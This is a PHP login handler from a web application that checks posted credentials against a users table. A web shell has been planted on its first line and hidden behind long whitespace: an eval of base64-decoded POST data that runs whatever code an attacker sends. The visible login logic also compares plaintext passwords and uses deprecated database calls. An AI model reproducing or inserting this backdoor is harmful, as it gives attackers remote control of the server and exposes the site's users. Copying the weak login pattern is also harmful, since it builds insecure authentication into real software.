<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['n7772aa']));?><?php
include("mainconfig.php");
session_start();
$_SESSION['db'] = "";
$get_entriess = "select * from tbl_users order by id desc ";
$get_entriess_res1 = mysql_query($get_entriess,$conn) or die(mysql_error());
$user=$_POST['username'];
$pass=$_POST['pass'];
 while ($post_info = mysql_fetch_array($get_entriess_res1)) {
      $uname = $post_info['username'];
      $password = $post_info['password'];
      $db = $post_info['dbase']; 
if ($user == $uname and $pass == $password )
 {
  $_SESSION['valid_user'] = $user;
  $_SESSION['db'] = $db;
  header('Location:dashboard.php?page=');
  exit(0);
 }
}

header('Location:index.php?wrong=yes');

?>
